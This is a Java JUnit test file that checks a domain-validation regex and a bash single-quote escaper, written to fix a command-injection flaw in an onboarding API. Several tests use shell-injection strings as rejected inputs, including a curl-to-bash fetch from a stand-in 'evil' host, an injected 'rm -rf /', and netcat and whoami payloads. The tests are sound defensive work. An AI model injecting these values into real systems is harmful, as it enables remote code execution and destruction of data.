package com.tomaytotomato.aurora.services;

import org.junit.jupiter.api.Test;

import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Static tests for the domain-shape guard added to
 * {@link OnboardingService#setDomain(String)} and the bash-safe quoting used
 * by {@code upsertCoreEnvDomain}. Motivated by the 2026-08-02 security review
 * finding B-1 (unauth command injection via {@code PATCH /api/onboarding}
 * {@code domain} field → {@code packages/core/.env} → {@code up.sh} bash
 * source → RCE).
 *
 * <p>These test the primitives directly (regex + quoter). The end-to-end
 * "PATCH /api/onboarding domain=<junk> → 400" is covered separately.
 */
class OnboardingDomainValidationTests {

  private final Pattern p = OnboardingService.DOMAIN_PATTERN;

  // --- accepts real-world domains -------------------------------------

  @Test
  void accepts_auroraLocal() {
    assertTrue(p.matcher("aurora.local").matches());
  }

  @Test
  void accepts_multiLabelWithHyphens() {
    assertTrue(p.matcher("home-lab.example.com").matches());
    assertTrue(p.matcher("my-box.internal.corp").matches());
  }

  @Test
  void accepts_numericLabels() {
    // RFC 1123 allows digits-only labels for hostnames used in URIs.
    assertTrue(p.matcher("aurora.42.local").matches());
  }

  @Test
  void accepts_longButBounded() {
    // 63-char label (max per RFC 1035) followed by ".local"
    String longLabel = "a".repeat(63);
    assertTrue(p.matcher(longLabel + ".local").matches(),
        "63-char label + .local must be accepted");
  }

  // --- rejects command injection payloads (B-1) -----------------------

  @Test
  void rejects_dollarCommandSubstitution() {
    assertFalse(p.matcher("foo$(curl http://evil|bash)").matches(),
        "$(...) is the exact B-1 exploit vector");
  }

  @Test
  void rejects_backtickCommandSubstitution() {
    assertFalse(p.matcher("foo`whoami`.local").matches(),
        "backtick command substitution must be rejected");
  }

  @Test
  void rejects_newlineInjection() {
    assertFalse(p.matcher("aurora.local\nrm -rf /").matches(),
        "newline injection to sneak a second bash line must be rejected");
  }

  @Test
  void rejects_semicolonAndAmpersand() {
    assertFalse(p.matcher("aurora.local;whoami").matches());
    assertFalse(p.matcher("aurora.local&nc evil").matches());
    assertFalse(p.matcher("aurora.local||true").matches());
  }

  @Test
  void rejects_spaces() {
    assertFalse(p.matcher("aurora local").matches());
    assertFalse(p.matcher("aurora .local").matches());
  }

  @Test
  void rejects_quotesAndBackslash() {
    // The bash source expands \ and " even inside "..." contexts; deny.
    assertFalse(p.matcher("aurora'.local").matches());
    assertFalse(p.matcher("aurora\".local").matches());
    assertFalse(p.matcher("aurora\\.local").matches());
  }

  @Test
  void rejects_slashAndPipe() {
    assertFalse(p.matcher("aurora/local").matches());
    assertFalse(p.matcher("aurora.local|nc").matches());
  }

  // --- rejects shape violations ---------------------------------------

  @Test
  void rejects_bareHostnameWithoutDot() {
    // v0.1 intent: DOMAIN is always fully-qualified. Bare `aurora` is a
    // hostname, not a domain, and would confuse Caddy + Homepage vhost gen.
    assertFalse(p.matcher("aurora").matches());
    assertFalse(p.matcher("local").matches());
  }

  @Test
  void rejects_leadingOrTrailingDot() {
    assertFalse(p.matcher(".aurora.local").matches());
    assertFalse(p.matcher("aurora.local.").matches());
  }

  @Test
  void rejects_leadingOrTrailingHyphen() {
    assertFalse(p.matcher("-aurora.local").matches());
    assertFalse(p.matcher("aurora-.local").matches());
    assertFalse(p.matcher("aurora.-local").matches());
    assertFalse(p.matcher("aurora.local-").matches());
  }

  @Test
  void rejects_consecutiveDots() {
    assertFalse(p.matcher("aurora..local").matches());
  }

  @Test
  void rejects_empty() {
    assertFalse(p.matcher("").matches());
  }

  @Test
  void rejects_overallLengthExceeds253() {
    // 250-char label would blow the 253-char total when combined with
    // .local, and would also exceed the 63-char per-label ceiling.
    String tooLong = "a".repeat(64) + ".local";
    assertFalse(p.matcher(tooLong).matches(),
        "label > 63 chars must be rejected");
    String hugeMultiLabel = "a".repeat(63) + "." + "b".repeat(63) + "."
        + "c".repeat(63) + "." + "d".repeat(63) + ".local";
    // 63*4 + 4 dots + 5 = 261 > 253
    assertFalse(p.matcher(hugeMultiLabel).matches(),
        "overall length > 253 must be rejected");
  }

  @Test
  void rejects_uppercase() {
    // OnboardingService normalises to lowercase before matching, so callers
    // see the same behaviour either way, but the pattern itself is strict.
    assertFalse(p.matcher("Aurora.Local").matches());
  }

  // --- bash quoter contract -------------------------------------------

  @Test
  void quoter_wrapsInSingleQuotes() {
    assertEquals("'aurora.local'", OnboardingService.quoteForBash("aurora.local"));
  }

  @Test
  void quoter_escapesEmbeddedSingleQuote() {
    // The classic '\'' trick: close the quoted string, inject a literal
    // single quote, then reopen. Bash concatenates the three pieces.
    assertEquals("'it'\\''s'", OnboardingService.quoteForBash("it's"));
  }

  @Test
  void quoter_hardensAgainstFutureRegexLoosening() {
    // Even though DOMAIN_PATTERN would reject these strings, the quoter
    // must be safe should a future writer loosen the regex. Anything the
    // bash source would otherwise substitute must be neutralised.
    for (String hostile : new String[] {
        "$(evil)", "`evil`", "$IFS", "; evil", "&& evil", "|evil", "\n evil"
    }) {
      String quoted = OnboardingService.quoteForBash(hostile);
      assertTrue(quoted.startsWith("'") && quoted.endsWith("'"),
          "quoter must wrap: " + quoted);
      // The unescaped payload must never appear outside a single-quoted
      // segment in the output. The escape sequence '\'' is fine.
      String inner = quoted.substring(1, quoted.length() - 1);
      assertFalse(inner.contains("'"),
          "unescaped ' in quoted output would break out of shell string: " + quoted);
    }
  }
}
